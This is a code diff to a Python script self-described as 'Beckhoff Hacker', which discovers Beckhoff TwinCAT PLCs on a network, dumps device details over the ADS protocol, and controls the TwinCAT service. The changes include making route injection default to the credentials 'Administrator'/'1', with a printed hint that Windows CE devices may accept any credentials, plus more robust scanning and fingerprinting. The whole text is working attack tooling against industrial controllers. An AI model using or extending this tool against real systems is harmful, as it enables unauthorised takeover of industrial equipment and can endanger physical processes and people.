@@ -25,7 +25,7 @@
 
         --- Beckhoff Hacker ---
         It also performs detailed scanning using ADS, followed by controlling the
-        Twincat service.
+        Twincat service. (TCP/48898)
 '''
 import sys, os, binascii, socket, subprocess, time
 iTimeout=1 ## Seconds, waittime for answers
@@ -77,14 +77,17 @@ def getDevices(LHOST,LNETID,iTimeout):
         data,ip=data
         hexdata=binascii.hexlify(data)
         netid=hexdata[24:36]
-        twincatversion=str(int(hexdata[-8:-6]))+'.'+str(int(hexdata[-6:-4]))+'.'+str(int(hexdata[-2:]+hexdata[-4:-2],16))
+        twincatversion=str(int(hexdata[-8:-6],16))+'.'+str(int(hexdata[-6:-4],16))+'.'+str(int(hexdata[-2:]+hexdata[-4:-2],16))
         namelength=int(hexdata[54:56]+hexdata[52:54],16)
         name=data[28:27+namelength]
-        kernelstart=hexdata.split('14011401')[1]
-        try:
-            kernel=str(int(kernelstart[4:6]))+'.'+str(int(kernelstart[12:14]))+'.'+str(int(kernelstart[22:24]+kernelstart[20:22],16))
-        except:
-            kernel='Unknown'
+        if '14011401' in hexdata:
+            try:
+                kernelstart=hexdata.split('14011401')[1]
+                kernel=str(int(kernelstart[4:6]))+'.'+str(int(kernelstart[12:14]))+'.'+str(int(kernelstart[22:24]+kernelstart[20:22],16))
+            except:
+                kernel='Unknown'
+        else:
+            kernel='x86 Kernel'
         if name!='':
             arrDevices.append({'IP':ip[0],'NAME':name,'RNETID':netid,'TCVER':twincatversion,'WINVER':kernel})
     return arrDevices ## Array of devices[ip, name, netid, twincatversion, kernel]
@@ -106,9 +109,14 @@ def getState(device,LNETID):
     else:
         return 'ERROR'
 
-def verifyDevice(device,LHOST,LNETID):
+def verifyDevice(device,LHOST,LNETID,noprint=0):
     os.system('cls' if os.name == 'nt' else 'clear')
     state=getState(device,LNETID)
+    if noprint:
+        if state=='ERROR':
+            print('Device seems unreachable using TCP, please add a route!')
+            raw_input('Press [Enter] to continue')
+        return state
     if state=='RUN':
         print('Device is reachable and Twincat is running')
     elif state=='CONFIG':
@@ -131,11 +139,15 @@ def addRoute(device,LHOST,LNETID):
         print('Device seems reachable, sure to add a route?')
         ans=raw_input('Please type \'Y\' to do so [y/N]: ')
         if not ans.lower()=='y': return
-    if not device['WINVER'].split('.')[1]=='0':
-        print('Device is running non Windows CE (kernel '+device['WINVER']+'), correct credentials needed:')
-        user=raw_input('Device username [guest]: ')
-        passw=raw_input('Device password [1]: ')
-    if user=='': user='guest'
+    #if not device['WINVER'].split('.')[1]=='0':
+    #    print('Device is running non Windows CE (kernel '+device['WINVER']+'), correct credentials needed:')
+    #    user=raw_input('Device username [guest]: ')
+    #    passw=raw_input('Device password [1]: ')
+    if '.' in device['WINVER'] and device['WINVER'].split('.')[1]=='0':
+        print('Device is running Windows CE (kernel '+device['WINVER']+'), any credentials may work!')
+    user=raw_input('Device username [Administrator]: ')
+    passw=raw_input('Device password [1]: ')
+    if user=='': user='Administrator'
     if passw=='': passw='1'
     print('\nAdding route on '+device['NAME']+' ('+device['IP']+')')
     routename=socket.gethostname()
@@ -178,6 +190,7 @@ def addRoute(device,LHOST,LNETID):
 def getRemoteRoutes(s,device,LNETID,showme=True):
     ## Just keep requesting routes untill there is no answer
     returnarr = []
+    attempt=5 ## This sometimes ends prematurely (no responses), attempting it 5 times
     i=0
     while i>=0:
         ## IndexID, first route is '0', second is '1' etc...
@@ -185,8 +198,11 @@ def getRemoteRoutes(s,device,LNETID,showme=True):
         resp = send_and_recv(s, packet)
         
         if len(resp)<2094:
-            print(str(i)+' routes found')
-            i = -1
+            if attempt>0 and i==0:
+                attempt=attempt-1
+            else:
+                print(str(i)+' routes found')
+                i = -1
         else:
             HexNetID = binascii.hexlify(resp[46:52])
             NetID = str(int(HexNetID[:2],16))+'.'+str(int(HexNetID[2:4],16))+'.'
@@ -258,37 +274,43 @@ def delRoute(device,LHOST,LNETID):
 
 def getInfo(device,LNETID):
     os.system('cls' if os.name == 'nt' else 'clear')
-    '''
-    if getState(device,LNETID)=='ERROR':
-        print('Device unreachable. Please add remote route!')
-        raw_input('Press [Enter] to continue')
+    state=verifyDevice(device,LHOST,LNETID,1)
+    if state=='ERROR':
         return
-    '''
-    
+
+    if device['TCVER'].startswith('2'):
+        print('This device uses Twincat 2, only basic details are shown')
+
+    print('      ###--- DEVICE INFO ---###')        
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.settimeout(iTimeout)
     s.connect((device['IP'],48898))
-    import xml.etree.ElementTree as ET
-    ##ADS Read Request (extensive, invokeid 0x26, indexgroup 0x2bc, offset 0x1, cblength 0x240,d576)
-    packet = '00002c000000'+device['RNETID']+'1027'+LNETID+'8f80 0200 0400 0c000000 00000000 26000000 bc020000 01000000 40020000'
-    ## Has: TargetType, TargetVersion (Version, Revision, Build), TargetFeatures (NetId), Hardware (Model, SerialNo, CPUVersion, Date, CPUArchitecture)
-    ##        OsImage (ImageDevice, ImageVersion, ImageLevel, OsName, OsVersion)
-    ## Example:
-    ## <TargetType>CB3011-0001-M9002215923-001-CE</TargetType>
-    ## <TargetVersion><Version>3</Version><Revision>1</Revision><Build>4018</Build></TargetVersion>
-    ## <TargetFeatures><NetId>5.35.18.112.1.1</NetId></TargetFeatures>
-    ## <Hardware><Model>CB3011-0001-M900</Model><SerialNo>2215923-001</SerialNo><CPUVersion>2.2</CPUVersion><Date>25.11.15</Date><CPUArchitecture>5</CPUArchitecture></Hardware>
-    ## <OsImage><ImageDevice>CB3011</ImageDevice><ImageVersion>6.02e</ImageVersion><ImageLevel>HPS</ImageLevel><OsName>Windows CE</OsName><OsVersion>7.0</OsVersion></OsImage>
-    resp = send_and_recv(s, packet)[46:-1]
-    
-    root = ET.fromstring(resp)
 
-    print('      ###--- DEVICE INFO ---###')
-    print('TargetType: '+root[0].text)
-    print('TargetVersion: '+root[1][0].text+'.'+root[1][1].text+'.'+root[1][2].text)
-    print('TargetFeatures (NetId): '+root[2][0].text)
-    print('Hardware: Model='+root[3][0].text+', Serial='+root[3][1].text+', Version='+root[3][2].text+', Date='+root[3][3].text+', Architecture='+root[3][4].text)
-    print('OSImage: Device='+root[4][0].text+', Version='+root[4][1].text+', Level='+root[4][2].text+', OsName='+root[4][3].text+', OsVersion='+root[4][4].text)
+    if device['TCVER'].startswith('3'):
+        import xml.etree.ElementTree as ET
+        ##ADS Read Request (extensive, invokeid 0x26, indexgroup 0x2bc, offset 0x1, cblength 0x240,d576)
+        packet = '00002c000000'+device['RNETID']+'1027'+LNETID+'8f80 0200 0400 0c000000 00000000 26000000 bc020000 01000000 40020000'
+        ## Has: TargetType, TargetVersion (Version, Revision, Build), TargetFeatures (NetId), Hardware (Model, SerialNo, CPUVersion, Date, CPUArchitecture)
+        ##        OsImage (ImageDevice, ImageVersion, ImageLevel, OsName, OsVersion)
+        ## Example:
+        ## <TargetType>CB3011-0001-M9002215923-001-CE</TargetType>
+        ## <TargetVersion><Version>3</Version><Revision>1</Revision><Build>4018</Build></TargetVersion>
+        ## <TargetFeatures><NetId>5.35.18.112.1.1</NetId></TargetFeatures>
+        ## <Hardware><Model>CB3011-0001-M900</Model><SerialNo>2215923-001</SerialNo><CPUVersion>2.2</CPUVersion><Date>25.11.15</Date><CPUArchitecture>5</CPUArchitecture></Hardware>
+        ## <OsImage><ImageDevice>CB3011</ImageDevice><ImageVersion>6.02e</ImageVersion><ImageLevel>HPS</ImageLevel><OsName>Windows CE</OsName><OsVersion>7.0</OsVersion></OsImage>
+        resp = send_and_recv(s, packet)[46:-1]
+
+        root = ET.fromstring(resp)
+
+        print('TargetType: '+root[0].text)
+        print('TargetVersion: '+root[1][0].text+'.'+root[1][1].text+'.'+root[1][2].text)
+        print('TargetFeatures (NetId): '+root[2][0].text)
+        print('Hardware: Model='+root[3][0].text+', Serial='+root[3][1].text+', Version='+root[3][2].text+', Date='+root[3][3].text+', Architecture='+root[3][4].text)
+        print('OSImage: Device='+root[4][0].text+', Version='+root[4][1].text+', Level='+root[4][2].text+', OsName='+root[4][3].text+', OsVersion='+root[4][4].text)
+        print
+    print('OS Version: '+device['WINVER'])
+    print('Based on the devicename ('+device['NAME']+'), ')
+    print('   the MAC Address could be: 00-01-05-'+device['NAME'][-6:-4]+'-'+device['NAME'][-4:-2]+'-'+device['NAME'][-2:])
     print
     print('      ###--- DEVICE REMOTE ROUTES ---###')
     getRemoteRoutes(s,device,LNETID)
@@ -296,6 +318,7 @@ def getInfo(device,LNETID):
     s.close()
     state=getState(device,LNETID)
     print('      ###--- TWINCAT SERVICE ---###')
+    print('Twincat version: '+device['TCVER'])
     print('Twincat is currently in '+state+' mode')
     print
     raw_input('Press [Enter] to continue')
@@ -351,7 +374,7 @@ LNETID=hex(int(LHOST.split('.')[0]))[2:].zfill(2) + hex(int(LHOST.split('.')[1])
 LNETID+=hex(int(LHOST.split('.')[2]))[2:].zfill(2) + hex(int(LHOST.split('.')[3]))[2:].zfill(2) + '0101'
 
 os.system('cls' if os.name == 'nt' else 'clear')
-## Get Devicelist (array of 'IP', 'Name', 'AMSNetID', 'Twincatversion', 'Kernelbuild')
+## Get Devicelist (array of 'IP', 'NAME', 'AMSNetID', 'Twincatversion [TCVER]', 'Kernelbuild [WINVER]')
 arrDevices=getDevices(LHOST,LNETID,iTimeout)
 if len(arrDevices)==0:
     print('No devices found, stopping')
@@ -367,7 +390,7 @@ while True:
         amsnetid = str(int(device['RNETID'][:2],16))+'.'+str(int(device['RNETID'][2:4],16))+'.'
         amsnetid += str(int(device['RNETID'][4:6],16))+'.'+str(int(device['RNETID'][6:8],16))+'.'
         amsnetid += str(int(device['RNETID'][8:10],16))+'.'+str(int(device['RNETID'][10:12],16))
-        print('['+str(i)+'] '+device['IP']+' ('+device['NAME']+', '+amsnetid+', '+device['WINVER']+')')
+        print('['+str(i)+'] '+device['IP']+' ('+device['NAME']+', '+amsnetid+', '+device['WINVER']+', '+device['TCVER']+')')
         i+=1
     print('[Q] Quit now')
     answer=raw_input('Please select the device [1]: ')
